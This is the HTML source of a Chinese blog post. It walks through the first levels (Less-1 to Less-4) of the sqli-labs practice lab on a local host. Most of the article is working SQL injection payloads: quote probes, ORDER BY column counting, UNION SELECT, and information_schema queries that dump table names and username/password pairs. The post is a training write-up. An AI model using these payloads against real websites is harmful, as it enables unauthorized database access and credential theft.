@@ -1,0 +1,857 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>sql-labs通关笔记(上) | Don_Joshua's Blog</title><meta name="author" content="Don Joshua"><meta name="copyright" content="Don Joshua"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="sql-labs通关笔记(上)  联合查询注入 Less-1：GET -Error based.Single quotes -string 界面  在url中加入?id&#x3D;1  ?id&#x3D;-1  判断注入点 使用’或\来判断是否存在注入点  payload 1http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;-1&amp;#x27; 报错信息 1near &amp;#x27;&amp;#x27;-1&amp;#x27">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql-labs通关笔记(上)">
+<meta property="og:url" content="http://example.com/2024/07/01/sql-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0(%E4%B8%8A)/index.html">
+<meta property="og:site_name" content="Don_Joshua&#39;s Blog">
+<meta property="og:description" content="sql-labs通关笔记(上)  联合查询注入 Less-1：GET -Error based.Single quotes -string 界面  在url中加入?id&#x3D;1  ?id&#x3D;-1  判断注入点 使用’或\来判断是否存在注入点  payload 1http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;-1&amp;#x27; 报错信息 1near &amp;#x27;&amp;#x27;-1&amp;#x27">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/avatar.jpg">
+<meta property="article:published_time" content="2024-07-01T06:05:34.000Z">
+<meta property="article:modified_time" content="2024-07-01T02:12:46.054Z">
+<meta property="article:author" content="Don Joshua">
+<meta property="article:tag" content="sql注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2024/07/01/sql-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0(%E4%B8%8A)/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'sql-labs通关笔记(上)',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-07-01 10:12:46'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = url => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      link.onload = () => resolve()
+      link.onerror = () => reject()
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/font.css"><link rel="stylesheet" href="/css/mystyle.css"><link rel="stylesheet" href="/css/textStyle.css"><link rel="stylesheet" href="/css_layout/calendar.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">36</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-jiarufangjian-01"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-shijian"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw iconfont icon-fenlei2"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-biaoqiankuozhan_xiuxian-214"></i><span> 休闲</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/game/"><i class="fa-fw iconfont icon-youxi"></i><span> 游戏</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw iconfont icon-dianying"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-iconzhengli"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent"><nav id="nav"><span id="blog-info"><a id="site-name" href="/">Don_Joshua's Blog</a></span><div id="menus"></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-jiarufangjian-01"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-shijian"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw iconfont icon-fenlei2"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-biaoqiankuozhan_xiuxian-214"></i><span> 休闲</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/game/"><i class="fa-fw iconfont icon-youxi"></i><span> 游戏</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw iconfont icon-dianying"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-iconzhengli"></i><span> 关于</span></a></div></div><center id="name-container"><a id="page-name" href="javascript:scrollToTop()">PAGE_NAME</a></center><div id="nav-right"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">sql-labs通关笔记(上)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-07-01T06:05:34.000Z" title="发表于 2024-07-01 14:05:34">2024-07-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-07-01T02:12:46.054Z" title="更新于 2024-07-01 10:12:46">2024-07-01</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">6.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>25分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="sql-labs通关笔记(上)"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1>sql-labs通关笔记(上)</h1>
+<p><img src="Untitled.png" alt="Untitled"></p>
+<h1>联合查询注入</h1>
+<h2 id="Less-1：GET-Error-based-Single-quotes-string">Less-1：GET -Error based.Single quotes -string</h2>
+<h3 id="界面">界面</h3>
+<p><img src="Untitled%201.png" alt="Untitled"></p>
+<p>在url中加入<code>?id=1</code></p>
+<p><img src="Untitled%202.png" alt="Untitled"></p>
+<p><code>?id=-1</code></p>
+<p><img src="Untitled%203.png" alt="Untitled"></p>
+<h3 id="判断注入点">判断注入点</h3>
+<p>使用’或\来判断是否存在注入点</p>
+<p><img src="Untitled%204.png" alt="Untitled"></p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-1/?<span class="built_in">id</span>=-1<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><strong>报错信息</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near <span class="string">&#x27;&#x27;</span>-1<span class="string">&#x27;&#x27;</span> LIMIT 0,1<span class="string">&#x27; at line 1</span></span><br></pre></td></tr></table></figure>
+<p>报错信息中，去掉用于标识的两个单引号，报错信息为<code>'-1'' LIMIT 0,1</code></p>
+<p>可以看到我们这一关的sql语句是用单引号闭合的，我们确认一下</p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-1/?<span class="built_in">id</span>=-1<span class="string">&#x27; or 1=1--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>回显</strong></p>
+<p><img src="Untitled%205.png" alt="Untitled"></p>
+<p>现在已经可以确定其存在字符型的注入点，使用单引号闭合</p>
+<h3 id="判断字段数">判断字段数</h3>
+<p><strong>关于order by</strong></p>
+<p>众所周知，order by是用于排序的，而其中有一项就是可以按照查询数据的索引来举行排序</p>
+<p>比如：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="built_in">id</span>,title from news order by 2;</span><br></pre></td></tr></table></figure>
+<p>意思就是我们按照查询结果的第二个字段也就是<code>title</code>进行升序（默认升序）排序</p>
+<p><strong>结果：</strong></p>
+<p><img src="Untitled%206.png" alt="Untitled"></p>
+<p>但是当我们的索引号大于我们查询的字段总数时，就会报错，就比如刚刚一段代码，我们查询的字段数为2，当我们以第三个字段进行排序时，就会报错</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="built_in">id</span>,title from news order by 3;</span><br></pre></td></tr></table></figure>
+<p><strong>结果：</strong></p>
+<p><img src="Untitled%207.png" alt="Untitled"></p>
+<p>因此，我们可以借助order by这个关键字来判断查询语句中，查询的字段数数量</p>
+<p>我们大概可以看到，每次id改变，回显大概有两个，一个用户名，一个密码</p>
+<p><img src="Untitled%208.png" alt="Untitled"></p>
+<p>因此说明这条查询语句查询的字段至少是2个</p>
+<p>我们从3开始,发现并没有报错</p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-1/?<span class="built_in">id</span>=1<span class="string">&#x27; order by 3--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：</strong></p>
+<p><img src="Untitled%209.png" alt="Untitled"></p>
+<p>继续尝试4</p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-1/?<span class="built_in">id</span>=1<span class="string">&#x27; order by 4--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：</strong></p>
+<p><img src="Untitled%2010.png" alt="Untitled"></p>
+<p>由此我们可以发现，我们当前页面的sql语句查询的字段数为3</p>
+<p><strong>那么我们为什么要判断字段数呢？</strong></p>
+<p>因为我们要使用联合查询进行注入，而联合查询后面联合的sql查询语句查询的字段数需要和前面的sql语句一致，我们依旧在一个数据库中进行演示</p>
+<p>比如：</p>
+<p><strong>当后面查询语句查询的字段数和前面查询语句查询的字段数相同时：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="built_in">id</span>,title from news union select 1,2;</span><br></pre></td></tr></table></figure>
+<p><strong>结果：会将结果罗列到后面</strong></p>
+<p><img src="Untitled%2011.png" alt="Untitled"></p>
+<p><strong>当后面查询语句查询的字段数和前面查询语句查询的字段数不同时：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="built_in">id</span>,title from news union select 1,2,3;</span><br></pre></td></tr></table></figure>
+<p><strong>结果：会报错，具有不同的字段数</strong></p>
+<p><img src="Untitled%2012.png" alt="Untitled"></p>
+<p>判断出查询语句的字段数后，我们就可以判断回显位置了，判断我们查询的（3个）字段，会有几个将结果回显到网页页面</p>
+<h3 id="判断回显位置">判断回显位置</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-1/?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,2,3--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：可以发现我们的2，3回显到网页页面了，因此我们后面就可以将需要查询的信息，放到2，3的位置上即可</strong></p>
+<p><img src="Untitled%2013.png" alt="Untitled"></p>
+<p><strong>那么，为什么前面要将id=-1？</strong></p>
+<p>因为我们网页的回显位置有限，为了将我们想要的数据回显到页面上可以回显的位置，所以需要将原本的查询结果集置为空，因为没有id=-1的数据，所以我们想要的数据1，2，3就会优先填充到回显位上了</p>
+<h3 id="爆破数据库名">爆破数据库名</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,2,database()--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：查询到当前数据库名称为security</strong></p>
+<p><img src="Untitled%2014.png" alt="Untitled"></p>
+<h3 id="爆破表名">爆破表名</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>group_concat()  将查询到的多个值聚合成一个字符串，依旧是因为回显位置不足，将其聚合在一个字符串，可以直接全部回显出来</li>
+<li>information_schema MYSQL自带的数据库，里面含有<code>schemas</code>，<code>tables</code>，<code>coulmns</code>表等，分别储存着所有数据库的信息（包括名称，其余也是），所有表的信息，所有字段的信息，是我们sql注入的强大利器</li>
+</ul>
+<p><strong>结果：得到表名emails,referers,uagents,users</strong></p>
+<p><img src="Untitled%2015.png" alt="Untitled"></p>
+<p>一般来说我们最需要的就是用户名和密码，这种东西一般存在users表中，接下来爆破users表的字段</p>
+<h3 id="爆破字段名">爆破字段名</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span><span class="built_in">users</span><span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：成功得到字段名user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,uname,passwd</strong></p>
+<p><img src="Untitled%2016.png" alt="Untitled"></p>
+<p>可以看到我们查出的数据有点多，我们去数据库中对比一下</p>
+<p><img src="Untitled%2017.png" alt="Untitled"></p>
+<p>发现其实只有三个字段，那么，<strong>为什么会查出这么多呢？</strong></p>
+<p>没错，因为我们没有指定数据库的名称，只指定了表的名字，当多个数据库中存在相同的表名时，都会被查询出来。如果出现了这种情况，我们可以同时指定数据库的名称</p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span><span class="built_in">users</span><span class="string">&#x27; and table_schema=&#x27;</span>security<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：只有id,username,password</strong></p>
+<p><img src="Untitled%2018.png" alt="Untitled"></p>
+<p>而我们需要的数据，就是<code>username</code>和<code>password</code></p>
+<h3 id="爆破数据">爆破数据</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,2,group_concat(username,0x7e,password) from users--+</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>0x7e ~的十六进制编码，用来分隔数据</li>
+</ul>
+<p><strong>结果：得到所有数据，第一关结束</strong></p>
+<p><img src="Untitled%2019.png" alt="Untitled"></p>
+<h2 id="Less-2：GET-Error-based-intiger-based">Less-2：GET -Error based -intiger based</h2>
+<h3 id="界面-2">界面</h3>
+<p>在url中加入<code>?id=1</code></p>
+<p><img src="Untitled%2020.png" alt="Untitled"></p>
+<p>在url中加入<code>?id=-1</code></p>
+<p><img src="Untitled%2021.png" alt="Untitled"></p>
+<h3 id="判断注入点-2">判断注入点</h3>
+<p>使用’或\来判断是否存在注入点</p>
+<p><img src="Untitled%2022.png" alt="Untitled"></p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-2/?<span class="built_in">id</span>=-1\</span><br></pre></td></tr></table></figure>
+<p><strong>报错信息</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near <span class="string">&#x27;\ LIMIT 0,1&#x27;</span> at line 1</span><br></pre></td></tr></table></figure>
+<p>去掉，用来引用报错信息的单引号，我们可以知道，存在注入点，并且为数值型注入</p>
+<h3 id="判断字段数-2">判断字段数</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1 order by 3--+</span><br></pre></td></tr></table></figure>
+<p><strong>结果</strong></p>
+<p><img src="Untitled%2023.png" alt="Untitled"></p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1 order by 4--+</span><br></pre></td></tr></table></figure>
+<p><strong>结果：判断出字段数为3</strong></p>
+<p><img src="Untitled%2024.png" alt="Untitled"></p>
+<h3 id="判断回显位置-2">判断回显位置</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1 union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+<p><strong>结果：可以发现我们的2，3回显到网页页面了，因此我们后面就可以将需要查询的信息，放到2，3的位置上即可</strong></p>
+<p><img src="Untitled%2025.png" alt="Untitled"></p>
+<h3 id="爆破数据库名-2">爆破数据库名</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1 union select 1,2,database()--+</span><br></pre></td></tr></table></figure>
+<p><strong>结果：查询到当前数据库名称为security</strong></p>
+<p><img src="Untitled%2026.png" alt="Untitled"></p>
+<h3 id="爆破表名-2">爆破表名</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1 union select 1,2,group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">&#x27;security&#x27;</span>--+</span><br></pre></td></tr></table></figure>
+<p><strong>结果：得到表名emails,referers,uagents,users</strong></p>
+<p><img src="Untitled%2027.png" alt="Untitled"></p>
+<h3 id="爆破字段名-2">爆破字段名</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1 union select 1,2,group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_name=<span class="string">&#x27;users&#x27;</span> and table_schema=<span class="string">&#x27;security&#x27;</span>--+</span><br></pre></td></tr></table></figure>
+<p><strong>结果：成功得到字段名id,username,password</strong></p>
+<p><img src="Untitled%2028.png" alt="Untitled"></p>
+<h3 id="爆破数据-2">爆破数据</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1 union select 1,2,group_concat(username,0x7e,password) from <span class="built_in">users</span>--+</span><br></pre></td></tr></table></figure>
+<p><strong>结果：得到所有数据，第二关结束</strong></p>
+<p><img src="Untitled%2029.png" alt="Untitled"></p>
+<h2 id="Less-3：GET-Error-based-Single-quotes-with-twist-string">Less-3：GET -Error based -Single quotes with twist -string</h2>
+<h3 id="界面-3">界面</h3>
+<p>在url中加入<code>?id=1</code></p>
+<p><img src="Untitled%2030.png" alt="Untitled"></p>
+<p>在url中加入<code>?id=-1</code></p>
+<p><img src="Untitled%2031.png" alt="Untitled"></p>
+<h3 id="判断注入点-3">判断注入点</h3>
+<p>使用’或\来判断是否存在注入点</p>
+<p><img src="Untitled%2032.png" alt="Untitled"></p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-3/?<span class="built_in">id</span>=-1\</span><br></pre></td></tr></table></figure>
+<p><strong>报错信息</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near <span class="string">&#x27;&#x27;</span>-1\<span class="string">&#x27;) LIMIT 0,1&#x27;</span> at line 1</span><br></pre></td></tr></table></figure>
+<p>去掉用于引用报错信息的单引号<code>'-1\') LIMIT 0,1</code> 我们可以知道，此时的sql语句是用单引号和括号闭合的</p>
+<h3 id="判断字段数-3">判断字段数</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27;) order by 3--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果</strong></p>
+<p><img src="Untitled%2033.png" alt="Untitled"></p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27;) order by 4--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果:可以判断字段数为3</strong></p>
+<p><img src="Untitled%2034.png" alt="Untitled"></p>
+<h3 id="判断回显位置-3">判断回显位置</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27;) union select 1,2,3--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：可以发现我们的2，3回显到网页页面了，因此我们后面就可以将需要查询的信息，放到2，3的位置上即可</strong></p>
+<p><img src="Untitled%2035.png" alt="Untitled"></p>
+<h3 id="爆破数据库名-3">爆破数据库名</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27;) union select 1,2,database()--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：查询到当前数据库名称为security</strong></p>
+<p><img src="Untitled%2036.png" alt="Untitled"></p>
+<h3 id="爆破表名-3">爆破表名</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：得到表名emails,referers,uagents,users</strong></p>
+<p><img src="Untitled%2037.png" alt="Untitled"></p>
+<h3 id="爆破字段名-3">爆破字段名</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span><span class="built_in">users</span><span class="string">&#x27; and table_schema=&#x27;</span>security<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：成功得到字段名id,username,password</strong></p>
+<p><img src="Untitled%2038.png" alt="Untitled"></p>
+<h3 id="爆破数据-3">爆破数据</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27;) union select 1,2,group_concat(username,0x7e,password) from users--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：得到所有数据，第三关结束</strong></p>
+<p><img src="Untitled%2039.png" alt="Untitled"></p>
+<h2 id="Less-4：GET-Error-based-Double-Quotes-string">Less-4：GET -Error based -Double Quotes -string</h2>
+<h3 id="界面-4">界面</h3>
+<p>在url中加入<code>?id=1</code></p>
+<p><img src="Untitled%2040.png" alt="Untitled"></p>
+<p>在url中加入<code>?id=-1</code></p>
+<p><img src="Untitled%2041.png" alt="Untitled"></p>
+<h3 id="判断注入点-4">判断注入点</h3>
+<p>使用’或\来判断是否存在注入点</p>
+<p><img src="Untitled%2042.png" alt="Untitled"></p>
+<p><strong>payload</strong></p>
